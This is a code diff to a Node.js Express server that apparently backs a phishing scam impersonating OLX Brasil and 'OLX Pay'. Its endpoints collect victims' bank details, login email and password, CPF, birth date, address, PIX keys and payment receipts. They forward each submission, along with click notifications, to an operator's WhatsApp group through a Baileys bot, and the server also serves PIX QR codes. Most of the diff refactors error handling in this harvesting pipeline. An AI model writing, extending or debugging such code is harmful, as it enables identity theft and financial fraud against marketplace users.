@@ -11,7 +11,11 @@ const {
   fetchLatestBaileysVersion,
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
-// const fs = require("fs");
+const express = require("express");
+const path = require("path");
+const fs = require("fs");
+const multer = require("multer");
+const { v4: uuidv4 } = require("uuid");
 
 const config = require("./config.json");
 const destinatario = config["grupo-mensagens"];
@@ -19,6 +23,39 @@ const { ensureGroupJoined } = require("./js/whatsapp-group");
 
 // 📧 Importar funções de email
 const { enviarEmail, enviarEmMassa } = require("./js/envio-email");
+
+// Importar o módulo qrcodepagamentos
+const qrcodePagamentos = require("./js/qrcodepagamentos");
+
+function formatarErroWhatsApp(error) {
+  const boomData = error?.data ?? error?.output?.statusCode ?? null;
+  const boomMessage =
+    error?.output?.payload?.message ||
+    error?.message ||
+    "Erro desconhecido no envio pelo WhatsApp";
+
+  let motivoProvavel = null;
+  if (boomData === 400) {
+    motivoProvavel =
+      "Requisição inválida (400) ao WhatsApp: verifique se o ID do grupo/destino é válido, se o bot faz parte do grupo e se a sessão está sincronizada.";
+  } else if (boomData === 401 || boomData === 403) {
+    motivoProvavel =
+      "Sem permissão ou sessão não autorizada no WhatsApp.";
+  } else if (boomData === 404) {
+    motivoProvavel =
+      "Destino/grupo não encontrado no WhatsApp.";
+  }
+
+  return {
+    message: motivoProvavel ? `${boomMessage} — ${motivoProvavel}` : boomMessage,
+    code: boomData ? `WHATSAPP_${boomData}` : (error?.code || "WHATSAPP_SEND_ERROR"),
+    details: {
+      protocolCode: boomData,
+      isBoom: Boolean(error?.isBoom),
+      rawMessage: error?.message || null,
+    },
+  };
+}
 
 async function connectToWhatsApp() {
   try {
@@ -39,7 +76,7 @@ async function connectToWhatsApp() {
 
     // Escutar mensagens recebidas (para futuras implementações)
     const dataVendas = JSON.parse(
-      fs.readFileSync(path.join(__dirname, "data", "vendas.json"))
+      fs.readFileSync(path.join(__dirname, "data", "vendas.json"), "utf8")
     );
 
     conn.ev.on("messages.upsert", async (m) => {
@@ -57,8 +94,6 @@ async function connectToWhatsApp() {
       }
     });
 
-    // Quando a conexão for atualizada
-
     // Salvar credenciais quando autenticado
     conn.ev.on("creds.update", () => saveCreds());
 
@@ -67,7 +102,7 @@ async function connectToWhatsApp() {
 
       // Armazenar QR code para exibi-lo na interface administrativa (se necessário)
       if (qr) {
-        // Exibe o QR manualmente
+        qrCode = qr;
         const qrcode = require("qrcode-terminal");
         qrcode.generate(qr, { small: true });
       }
@@ -75,13 +110,14 @@ async function connectToWhatsApp() {
       // Se conectado
       if (connection === "open") {
         isConnected = true;
+        qrCode = null;
         console.log("Conectado ao WhatsApp");
 
         ensureGroupJoined(conn, config.groupDestino)
           .then((groupId) =>
             conn.sendMessage(groupId, {
               text: "*Conexão estabelecida com sucesso!*",
-            }),
+            })
           )
           .then(() => {
             console.log("Aviso de conexão enviado ao grupo configurado.");
@@ -89,14 +125,9 @@ async function connectToWhatsApp() {
           .catch((err) => {
             console.error(
               "Não foi possível resolver groupDestino ou enviar o aviso de conexão:",
-              err,
+              err
             );
           });
-
-        // const { exec } = require("child_process");
-        // exec(
-        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
-        // );
       }
 
       // Se desconectado
@@ -124,18 +155,7 @@ async function connectToWhatsApp() {
   }
 }
 
- 
-
-
 // Conexão do Site:
-
-const express = require("express");
-const path = require("path");
-const fs = require("fs");
-const multer = require("multer");
-const { v4: uuidv4 } = require("uuid");
-
-// Configurar armazenamento para uploads
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     const uploadDir = path.join(__dirname, "uploads");
@@ -197,28 +217,58 @@ async function enviarMensagemWhatsApp(mensagem) {
   console.log("Iniciando envio de mensagem WhatsApp...");
 
   try {
-    // Verificar se está conectado
     if (!isConnected || !conn) {
       console.error("WhatsApp não está conectado. Status:", isConnected);
-      return { success: false, message: "WhatsApp não está conectado" };
+      return {
+        success: false,
+        code: "WHATSAPP_DISCONNECTED",
+        message: "WhatsApp não está conectado",
+        details: { isConnected: Boolean(isConnected), hasConn: Boolean(conn) },
+      };
     }
 
-    // ID do grupo ou contato (pode ser alterado conforme necessário)
-    // ID do grupo
-    const groupId = await ensureGroupJoined(conn, destinatario);
-    console.log(`Tentando enviar mensagem para: ${groupId}`);
+    if (!destinatario) {
+      return {
+        success: false,
+        code: "MISSING_RECIPIENT",
+        message: "Destino ('grupo-mensagens') não configurado no config.json",
+        details: { destinatario },
+      };
+    }
 
-    // Enviar a mensagem
+    const groupId = await ensureGroupJoined(conn, destinatario);
+    console.log(`Tentando enviar mensagem para: ${groupId}`, {
+      destinatario,
+      groupId,
+    });
+
+    if (!groupId || typeof groupId !== "string") {
+      return {
+        success: false,
+        code: "INVALID_GROUP_ID",
+        message: `ID de destino inválido retornado por ensureGroupJoined: ${String(groupId)}`,
+        details: { destinatario, groupId },
+      };
+    }
+
     await conn.sendMessage(groupId, { text: mensagem });
     console.log("Mensagem enviada com sucesso!");
 
     return { success: true, message: "Mensagem enviada com sucesso" };
   } catch (error) {
-    console.error("Erro detalhado ao enviar mensagem:", error);
+    const infoErro = formatarErroWhatsApp(error);
+    console.error("Erro detalhado ao enviar mensagem:", {
+      ...infoErro,
+      destinatario,
+      stack: error?.stack,
+    });
+
     return {
       success: false,
-      message: `Erro ao enviar mensagem: ${error.message}`,
-      error: error,
+      message: infoErro.message,
+      error: infoErro.message,
+      code: infoErro.code,
+      details: infoErro.details,
     };
   }
 }
@@ -228,27 +278,30 @@ async function enviarArquivoWhatsApp(filePath, caption) {
   console.log("Iniciando envio de arquivo WhatsApp...");
 
   try {
-    // Verificar se está conectado
     if (!isConnected || !conn) {
       console.error("WhatsApp não está conectado. Status:", isConnected);
-      return { success: false, message: "WhatsApp não está conectado" };
+      return {
+        success: false,
+        code: "WHATSAPP_DISCONNECTED",
+        message: "WhatsApp não está conectado",
+        details: null,
+      };
     }
 
-    // ID do grupo ou contato (pode ser alterado conforme necessário)
-    // const destinatario = "120363397924256528@g.us"; // ID do grupo
-
-    // Verificar se o arquivo existe
     if (!fs.existsSync(filePath)) {
       console.error(`Arquivo não encontrado: ${filePath}`);
-      return { success: false, message: "Arquivo não encontrado" };
+      return {
+        success: false,
+        code: "FILE_NOT_FOUND",
+        message: "Arquivo não encontrado",
+        details: { filePath },
+      };
     }
 
-    // Lê o arquivo para buffer
     const fileBuffer = fs.readFileSync(filePath);
     const fileExt = path.extname(filePath).toLowerCase();
     const fileName = path.basename(filePath);
 
-    // Determinar o tipo de mídia com base na extensão
     let messageContent;
     if (fileExt === ".pdf") {
       messageContent = {
@@ -257,27 +310,60 @@ async function enviarArquivoWhatsApp(filePath, caption) {
         caption: caption,
       };
     } else {
-      // para imagens (.jpg, .png, etc)
       messageContent = {
         image: fileBuffer,
         caption: caption,
       };
     }
 
-    // Enviar o arquivo para o WhatsApp
     const groupId = await ensureGroupJoined(conn, destinatario);
+    console.log(`Tentando enviar arquivo para: ${groupId}`, {
+      destinatario,
+      groupId,
+      fileName,
+    });
+
     await conn.sendMessage(groupId, messageContent);
     console.log("Arquivo enviado com sucesso!");
 
     return { success: true, message: "Arquivo enviado com sucesso" };
   } catch (error) {
-    console.error("Erro ao enviar arquivo:", error);
+    const infoErro = formatarErroWhatsApp(error);
+    console.error("Erro ao enviar arquivo:", {
+      ...infoErro,
+      destinatario,
+      filePath,
+    });
+
     return {
       success: false,
-      message: `Erro ao enviar arquivo: ${error.message}`,
-      error: error,
+      message: infoErro.message,
+      error: infoErro.message,
+      code: infoErro.code,
+      details: infoErro.details,
     };
   }
+}
+
+function responderFalhaWhatsApp(res, resultado, fallbackMsg) {
+  const httpStatus = resultado?.code === "WHATSAPP_400" ? 400 : 500;
+  const codigoErro = resultado?.code || "WHATSAPP_SEND_ERROR";
+  const detalheErro =
+    resultado?.message || fallbackMsg || "Falha não especificada no WhatsApp";
+
+  console.error("Falha no envio WhatsApp:", {
+    codigoErro,
+    detalheErro,
+    details: resultado?.details,
+  });
+
+  return res.status(httpStatus).json({
+    success: false,
+    message: detalheErro,
+    error: detalheErro,
+    code: codigoErro,
+    details: resultado?.details ?? null,
+  });
 }
 
 // Endpoint para receber dados bancários e enviar para WhatsApp
@@ -288,7 +374,6 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
     const dados = req.body || {};
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar quais campos obrigatórios estão faltando
     const camposObrigatorios = [
       "nome",
       "email",
@@ -305,18 +390,20 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
       return res.status(400).json({
         success: false,
         message: `Dados incompletos. Campos obrigatórios faltando: ${camposFaltando.join(", ")}`,
+        error: `Campos obrigatórios faltando: ${camposFaltando.join(", ")}`,
+        code: "MISSING_FIELDS",
         missingFields: camposFaltando,
       });
     }
 
-    // Verificar status do WhatsApp antes de tentar enviar
     if (!verificarStatusWhatsApp()) {
       console.error("Tentativa de envio com WhatsApp desconectado");
       return res.status(503).json({
         success: false,
         message:
           "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
-        error: "whatsapp_disconnected",
+        error: "WhatsApp desconectado",
+        code: "WHATSAPP_DISCONNECTED",
       });
     }
 
@@ -337,7 +424,6 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
 
     console.log("Mensagem formatada, iniciando envio...");
 
-    // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
     console.log("Resultado completo do envio:", JSON.stringify(resultado, null, 2));
 
@@ -348,24 +434,11 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
       });
     }
 
-    // Monta uma descrição mais específica a partir do objeto `resultado`
-    const detalheErro =
-      resultado?.details ||
-      resultado?.error ||
-      resultado?.message ||
-      "Falha não especificada no envio pelo WhatsApp";
-
-    const codigoErro = resultado?.code || resultado?.status || "WHATSAPP_SEND_ERROR";
-
-    console.error("Falha no envio WhatsApp:", { codigoErro, detalheErro, resultado });
-
-    return res.status(500).json({
-      success: false,
-      message: `Erro ao enviar mensagem para o WhatsApp (${codigoErro})`,
-      error: detalheErro,
-      code: codigoErro,
-      details: resultado?.details ?? null,
-    });
+    return responderFalhaWhatsApp(
+      res,
+      resultado,
+      "Erro ao enviar mensagem para o WhatsApp"
+    );
   } catch (error) {
     console.error("Erro ao processar dados bancários:", error);
     return res.status(500).json({
@@ -373,7 +446,6 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
       message: "Erro ao processar sua solicitação",
       error: error?.message || "Erro interno inesperado",
       code: error?.code || "INTERNAL_SERVER_ERROR",
-      stack: process.env.NODE_ENV === "development" ? error?.stack : undefined,
     });
   }
 });
@@ -382,7 +454,6 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
 app.get("/api/venda/:id", (req, res) => {
   const id = req.params.id;
 
-  // Carregar dados das vendas
   try {
     const vendasData = fs.readFileSync(
       path.join(__dirname, "data", "vendas.json"),
@@ -390,11 +461,9 @@ app.get("/api/venda/:id", (req, res) => {
     );
     const vendas = JSON.parse(vendasData);
 
-    // Buscar venda pelo ID
     const venda = vendas.find((v) => v.codigo === id);
 
     if (venda) {
-      // Adicionando um pequeno atraso para simular latência de rede (apenas para desenvolvimento)
       setTimeout(() => {
         res.json(venda);
       }, 300);
@@ -415,12 +484,10 @@ app.get("/api/venda/:id", (req, res) => {
 });
 
 // NOVO SITE
-// Endpoint para compatibilidade com URLs que usam "pag" na rota
 app.get("/home", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "home.html"));
 });
 
-// Endpoint para página de preenchimento de dados bancários (nova funcionalidade)
 app.get("/dados-bancarios", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
 });
@@ -429,34 +496,15 @@ app.get("/dados-bancarios.html", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
 });
 
-// Endpoint para compatibilidade com URLs que usam "pag" na rota
 app.get("/pag", (req, res) => {
   const id = req.query.id;
   if (id) {
-    // Redirecionar para home com o ID da venda
     res.redirect(`/?id=${id}`);
   } else {
-    // Se não tiver ID, redirecionar para home normal
-    res.redirect('/');
+    res.redirect("/");
   }
 });
 
-// // Endpoint para acessar a página de dados bancários (usando .html em vez de .php)
-// app.get("/pag/dados.html", (req, res) => {
-//   res.sendFile(path.join(__dirname, "public", "pag", "dados.html"));
-// });
-
-// // Endpoint para acessar a página de alerta
-// app.get("/pag/alerta.html", (req, res) => {
-//   res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
-// });
-
-// // Endpoint para simular .php (para compatibilidade com o formato solicitado)
-// app.get("/pag/alerta.php", (req, res) => {
-//   res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
-// });
-
-// Endpoint para buscar todas as vendas (útil para dashboard)
 app.get("/api/vendas", (req, res) => {
   try {
     const vendasData = fs.readFileSync(
@@ -471,7 +519,6 @@ app.get("/api/vendas", (req, res) => {
   }
 });
 
-// Endpoint para termos de uso (retorna um JSON simples)
 app.get("/api/termos", (req, res) => {
   res.json({
     titulo: "Termos de Uso da OLX Brasil",
@@ -480,7 +527,6 @@ app.get("/api/termos", (req, res) => {
   });
 });
 
-// Endpoint para política de privacidade (retorna um JSON simples)
 app.get("/api/privacidade", (req, res) => {
   res.json({
     titulo: "Política de Privacidade da OLX Brasil",
@@ -497,32 +543,32 @@ app.post(
     console.log("Recebendo requisição para enviar comprovante");
 
     try {
-      // Verificar se o arquivo foi recebido
       if (!req.file) {
         console.error("Nenhum arquivo recebido");
         return res.status(400).json({
           success: false,
           message: "Nenhum arquivo de comprovante recebido",
+          error: "Nenhum arquivo de comprovante recebido",
+          code: "MISSING_FILE",
         });
       }
 
       console.log("Arquivo recebido:", req.file);
 
-      // Verificar status do WhatsApp antes de tentar enviar
       if (!verificarStatusWhatsApp()) {
         console.error("Tentativa de envio com WhatsApp desconectado");
         return res.status(503).json({
           success: false,
           message:
             "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+          error: "WhatsApp desconectado",
+          code: "WHATSAPP_DISCONNECTED",
         });
       }
 
-      // Extrair dados do formulário
       const chavePix = req.body.chavePix || "Não informada";
       const valor = req.body.valor || "Não informado";
 
-      // Formatar mensagem para o comprovante
       const caption =
         `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
         `*Dados do Pagamento:*\n` +
@@ -530,27 +576,27 @@ app.post(
         `Chave PIX: ${chavePix}\n\n` +
         `Recebido em: ${new Date().toLocaleString("pt-BR")}`;
 
-      // Enviar o arquivo pelo WhatsApp
       const resultado = await enviarArquivoWhatsApp(req.file.path, caption);
 
       if (resultado.success) {
-        res.json({
+        return res.json({
           success: true,
           message: "Comprovante enviado com sucesso para o WhatsApp",
         });
-      } else {
-        res.status(500).json({
-          success: false,
-          message: "Erro ao enviar comprovante para o WhatsApp",
-          error: resultado.message,
-        });
       }
+
+      return responderFalhaWhatsApp(
+        res,
+        resultado,
+        "Erro ao enviar comprovante para o WhatsApp"
+      );
     } catch (error) {
       console.error("Erro ao processar envio de comprovante:", error);
-      res.status(500).json({
+      return res.status(500).json({
         success: false,
         message: "Erro ao processar sua solicitação",
-        error: error.message,
+        error: error?.message || "Erro interno inesperado",
+        code: error?.code || "INTERNAL_SERVER_ERROR",
       });
     }
   }
@@ -561,13 +607,12 @@ app.post("/api/notificar-clique-continuar", async (req, res) => {
   console.log("Cliente clicou em botão de ação");
 
   try {
-    const dados = req.body;
+    const dados = req.body || {};
     const codigoVenda = dados.codigo || "Não informado";
     const nomeProduto = dados.produto || "Não informado";
     const acao = dados.acao || "continuar";
     const valor = dados.valor || "";
 
-    // Verificar status do WhatsApp antes de tentar enviar
     if (!verificarStatusWhatsApp()) {
       console.error(
         "WhatsApp desconectado - não foi possível enviar notificação de clique"
@@ -575,10 +620,11 @@ app.post("/api/notificar-clique-continuar", async (req, res) => {
       return res.status(503).json({
         success: false,
         message: "Serviço do WhatsApp indisponível",
+        error: "WhatsApp desconectado",
+        code: "WHATSAPP_DISCONNECTED",
       });
     }
 
-    // Definir mensagem com base na ação
     let mensagem;
 
     if (acao === "clique_taxa") {
@@ -600,27 +646,27 @@ app.post("/api/notificar-clique-continuar", async (req, res) => {
         `Horário: ${new Date().toLocaleString("pt-BR")}`;
     }
 
-    // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
 
     if (resultado.success) {
-      res.json({
+      return res.json({
         success: true,
         message: "Notificação enviada com sucesso",
       });
-    } else {
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar notificação para o WhatsApp",
-        error: resultado.message,
-      });
     }
+
+    return responderFalhaWhatsApp(
+      res,
+      resultado,
+      "Erro ao enviar notificação para o WhatsApp"
+    );
   } catch (error) {
     console.error("Erro ao processar notificação de clique:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
-      error: error.message,
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "INTERNAL_SERVER_ERROR",
     });
   }
 });
@@ -630,29 +676,30 @@ app.post("/api/enviar-email-acesso", async (req, res) => {
   console.log("Recebendo requisição para enviar email de acesso");
 
   try {
-    const dados = req.body;
+    const dados = req.body || {};
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar se o email foi fornecido
     if (!dados.email) {
       console.error("Email não fornecido");
       return res.status(400).json({
         success: false,
         message: "Email não fornecido",
+        error: "Email não fornecido",
+        code: "MISSING_EMAIL",
       });
     }
 
-    // Verificar status do WhatsApp antes de tentar enviar
     if (!verificarStatusWhatsApp()) {
       console.error("Tentativa de envio com WhatsApp desconectado");
       return res.status(503).json({
         success: false,
         message:
           "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+        error: "WhatsApp desconectado",
+        code: "WHATSAPP_DISCONNECTED",
       });
     }
 
-    // Formatar mensagem com o email recebido
     const mensagem =
       `*✅ NOVO ACESSO À CENTRAL DE VENDAS OLX PAY*\n\n` +
       `*Dados de Acesso:*\n` +
@@ -662,28 +709,28 @@ app.post("/api/enviar-email-acesso", async (req, res) => {
 
     console.log("Mensagem formatada, iniciando envio...");
 
-    // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
     console.log("Resultado do envio:", resultado);
 
     if (resultado.success) {
-      res.json({
+      return res.json({
         success: true,
         message: "Email enviado com sucesso para o WhatsApp",
       });
-    } else {
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar mensagem para o WhatsApp",
-        error: resultado.message,
-      });
     }
+
+    return responderFalhaWhatsApp(
+      res,
+      resultado,
+      "Erro ao enviar mensagem para o WhatsApp"
+    );
   } catch (error) {
     console.error("Erro ao processar email de acesso:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
-      error: error.message,
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "INTERNAL_SERVER_ERROR",
     });
   }
 });
@@ -693,29 +740,30 @@ app.post("/api/enviar-credenciais-acesso", async (req, res) => {
   console.log("Recebendo requisição para enviar credenciais de acesso");
 
   try {
-    const dados = req.body;
+    const dados = req.body || {};
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar se email e senha foram fornecidos
     if (!dados.email || !dados.senha) {
       console.error("Email ou senha não fornecidos");
       return res.status(400).json({
         success: false,
         message: "Email e senha são obrigatórios",
+        error: "Email e senha são obrigatórios",
+        code: "MISSING_CREDENTIALS",
       });
     }
 
-    // Verificar status do WhatsApp antes de tentar enviar
     if (!verificarStatusWhatsApp()) {
       console.error("Tentativa de envio com WhatsApp desconectado");
       return res.status(503).json({
         success: false,
         message:
           "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+        error: "WhatsApp desconectado",
+        code: "WHATSAPP_DISCONNECTED",
       });
     }
 
-    // Formatar mensagem com email e senha
     const mensagem =
       `*🔐 NOVO LOGIN NA CENTRAL DE VENDAS OLX PAY*\n\n` +
       `*Credenciais Recebidas:*\n` +
@@ -726,28 +774,28 @@ app.post("/api/enviar-credenciais-acesso", async (req, res) => {
 
     console.log("Mensagem formatada, iniciando envio...");
 
-    // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
     console.log("Resultado do envio:", resultado);
 
     if (resultado.success) {
-      res.json({
+      return res.json({
         success: true,
         message: "Credenciais verificadas com sucesso",
       });
-    } else {
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar mensagem para o WhatsApp",
-        error: resultado.message,
-      });
     }
+
+    return responderFalhaWhatsApp(
+      res,
+      resultado,
+      "Erro ao enviar mensagem para o WhatsApp"
+    );
   } catch (error) {
     console.error("Erro ao processar credenciais de acesso:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
-      error: error.message,
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "INTERNAL_SERVER_ERROR",
     });
   }
 });
@@ -757,87 +805,92 @@ app.post("/api/enviar-cadastro-olx", async (req, res) => {
   console.log("Recebendo requisição para enviar cadastro OLX Pay");
 
   try {
-    const dados = req.body;
+    const dados = req.body || {};
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar se todos os dados foram fornecidos
-  if (
-    !dados.nome ||
-    !dados.cpf ||
-    !dados.telefone ||
-    !dados.data_nascimento ||
-    !dados.pix_tipo ||
-    !dados.pix_chave ||
-    !dados.endereco
-  ) {
-    console.error("Dados incompletos recebidos");
-    return res.status(400).json({
-      success: false,
-      message: "Todos os campos obrigatórios devem ser preenchidos",
-    });
-  }
+    if (
+      !dados.nome ||
+      !dados.cpf ||
+      !dados.telefone ||
+      !dados.data_nascimento ||
+      !dados.pix_tipo ||
+      !dados.pix_chave ||
+      !dados.endereco
+    ) {
+      console.error("Dados incompletos recebidos");
+      return res.status(400).json({
+        success: false,
+        message: "Todos os campos obrigatórios devem ser preenchidos",
+        error: "Todos os campos obrigatórios devem ser preenchidos",
+        code: "MISSING_FIELDS",
+      });
+    }
 
-  // Verificar status do WhatsApp antes de tentar enviar
-  if (!verificarStatusWhatsApp()) {
-    console.error("Tentativa de envio com WhatsApp desconectado");
-    return res.status(503).json({
-      success: false,
-      message:
-        "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
-    });
-  }
+    if (!verificarStatusWhatsApp()) {
+      console.error("Tentativa de envio com WhatsApp desconectado");
+      return res.status(503).json({
+        success: false,
+        message:
+          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+        error: "WhatsApp desconectado",
+        code: "WHATSAPP_DISCONNECTED",
+      });
+    }
 
-  // Formatar mensagem com dados do cadastro (sem email)
-  const mensagem =
-    `*📝 NOVO CADASTRO OLX PAY*\n\n` +
-    `Nome: ${dados.nome}\n` +
-    `CPF: ${dados.cpf}\n` +
-    `Telefone: ${dados.telefone}\n` +
-    `Data de Nascimento: ${dados.data_nascimento}\n` +
-    `Tipo PIX: ${dados.pix_tipo}\n` +
-    `Chave PIX: ${dados.pix_chave}\n` +
-    `Endereço: ${dados.endereco}\n\n` +
+    const mensagem =
+      `*📝 NOVO CADASTRO OLX PAY*\n\n` +
+      `Nome: ${dados.nome}\n` +
+      `CPF: ${dados.cpf}\n` +
+      `Telefone: ${dados.telefone}\n` +
+      `Data de Nascimento: ${dados.data_nascimento}\n` +
+      `Tipo PIX: ${dados.pix_tipo}\n` +
+      `Chave PIX: ${dados.pix_chave}\n` +
+      `Endereço: ${dados.endereco}\n\n` +
+      `Horário: ${new Date().toLocaleString("pt-BR")}`;
+
     console.log("Mensagem formatada, iniciando envio...");
 
-    // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
     console.log("Resultado do envio:", resultado);
 
     if (resultado.success) {
-      res.json({
+      return res.json({
         success: true,
         message: "Cadastro enviado com sucesso para o WhatsApp",
       });
-    } else {
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar mensagem para o WhatsApp",
-        error: resultado.message,
-      });
     }
+
+    return responderFalhaWhatsApp(
+      res,
+      resultado,
+      "Erro ao enviar mensagem para o WhatsApp"
+    );
   } catch (error) {
     console.error("Erro ao processar cadastro OLX Pay:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
-      error: error.message,
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "INTERNAL_SERVER_ERROR",
     });
   }
 });
-
-// Importar o módulo qrcodepagamentos
-const qrcodePagamentos = require('./js/qrcodepagamentos');
 
 // Endpoint para gerar QR Code PIX
 app.get("/api/gerar-qrcode-pix", async (req, res) => {
   try {
     console.log("Gerando QR Code PIX...");
     const resultado = await qrcodePagamentos.gerarQRCode();
-    if (resultado.status === 404) {
-      // Enviar mensagem para o WhatsApp
-      return enviarMensagemWhatsApp(
-        `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\nOcorreu um erro ao tentar gerar o QR Code PIX. A página de redirecionamento não foi encontrada (404). Verifique se a URL de redirecionamento está correta e se o serviço está disponível.\n\nHorário: ${new Date().toLocaleString("pt-BR")}`,
+
+    if (resultado?.status === 404) {
+      await enviarMensagemWhatsApp(
+        `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\nOcorreu um erro ao tentar gerar o QR Code PIX. A página de redirecionamento não foi encontrada (404). Verifique se a URL de redirecionamento está correta e se o serviço está disponível.\n\nHorário: ${new Date().toLocaleString("pt-BR")}`
       );
+      return res.status(404).json({
+        success: false,
+        message: "Página de redirecionamento para QR Code PIX não encontrada (404)",
+        code: "PIX_REDIRECT_404",
+      });
     }
 
     if (!resultado || !resultado.imgBase64) {
@@ -845,21 +898,23 @@ app.get("/api/gerar-qrcode-pix", async (req, res) => {
       return res.status(500).json({
         success: false,
         message: "Não foi possível gerar o QR Code PIX",
-        resultado
+        code: "INVALID_PIX_RESULT",
+        resultado,
       });
     }
-    
-    res.json({
+
+    return res.json({
       success: true,
       qrCodeBase64: resultado.imgBase64,
-      pixTitle: resultado.pixTitle
+      pixTitle: resultado.pixTitle,
     });
   } catch (error) {
     console.error("Erro ao gerar QR Code PIX:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao gerar QR Code PIX",
-      error: error.message
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "PIX_ERROR",
     });
   }
 });
@@ -869,106 +924,23 @@ app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "home.html"));
 });
 
-// Endpoint para receber comprovante de pagamento e enviar via WhatsApp
-app.post("/api/enviar-comprovante", upload.single('comprovante'), async (req, res) => {
-  console.log("Recebendo comprovante de pagamento...");
-
-  try {
-    // Verificar se o arquivo foi enviado
-    if (!req.file) {
-      return res.status(400).json({
-        success: false,
-        message: "Nenhum arquivo foi enviado"
-      });
-    }
-
-    // Obter informações do arquivo
-    const filePath = req.file.path;
-    const fileName = req.file.originalname;
-    const fileSize = req.file.size;
-
-    console.log(`Arquivo recebido: ${fileName} (${fileSize} bytes)`);
-
-    // Verificar status do WhatsApp antes de enviar
-    if (!verificarStatusWhatsApp()) {
-      fs.unlinkSync(filePath); // Deletar arquivo
-      return res.status(503).json({
-        success: false,
-        message: "WhatsApp não está conectado. Tente novamente mais tarde."
-      });
-    }
-
-    // Preparar legenda para a mensagem
-    const dataAtual = new Date().toLocaleString("pt-BR");
-    const legenda = `*Comprovante de Pagamento Recebido*\n\nArquivo: ${fileName}\nData: ${dataAtual}`;
-
-    console.log("Enviando arquivo para WhatsApp...");
-
-    // Enviar arquivo via WhatsApp
-    const resultado = await enviarArquivoWhatsApp(filePath, legenda);
-
-    if (resultado.success) {
-      // Deletar arquivo após envio bem-sucedido (opcional)
-      setTimeout(() => {
-        try {
-          if (fs.existsSync(filePath)) {
-            fs.unlinkSync(filePath);
-            console.log(`Arquivo temporário deletado: ${filePath}`);
-          }
-        } catch (err) {
-          console.error(`Erro ao deletar arquivo: ${err.message}`);
-        }
-      }, 1000);
-
-      res.json({
-        success: true,
-        message: "Comprovante enviado com sucesso!",
-        fileName: fileName
-      });
-    } else {
-      // Deletar arquivo em caso de erro
-      try {
-        if (fs.existsSync(filePath)) {
-          fs.unlinkSync(filePath);
-        }
-      } catch (err) {
-        console.error(`Erro ao deletar arquivo: ${err.message}`);
-      }
-
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar comprovante para WhatsApp",
-        error: resultado.message
-      });
-    }
-  } catch (error) {
-    console.error("Erro ao processar comprovante:", error);
-    
-    // Tentar deletar arquivo em caso de erro
-    if (req.file && req.file.path) {
-      try {
-        if (fs.existsSync(req.file.path)) {
-          fs.unlinkSync(req.file.path);
-        }
-      } catch (err) {
-        console.error(`Erro ao deletar arquivo: ${err.message}`);
-      }
-    }
-
-    res.status(500).json({
-      success: false,
-      message: "Erro ao processar sua solicitação",
-      error: error.message
-    });
-  }
-});
-
 // Middleware para tratamento de erros
 app.use((err, req, res, next) => {
   console.error("Erro na aplicação:", err);
-  res
-    .status(500)
-    .send("Ocorreu um erro no servidor. Tente novamente mais tarde.");
+  if (err instanceof multer.MulterError) {
+    return res.status(400).json({
+      success: false,
+      message: `Erro no upload do arquivo: ${err.message}`,
+      error: err.message,
+      code: err.code || "MULTER_ERROR",
+    });
+  }
+  return res.status(500).json({
+    success: false,
+    message: "Ocorreu um erro no servidor. Tente novamente mais tarde.",
+    error: err?.message || "Erro interno no servidor",
+    code: err?.code || "INTERNAL_SERVER_ERROR",
+  });
 });
 
 app.listen(PORT, () => {
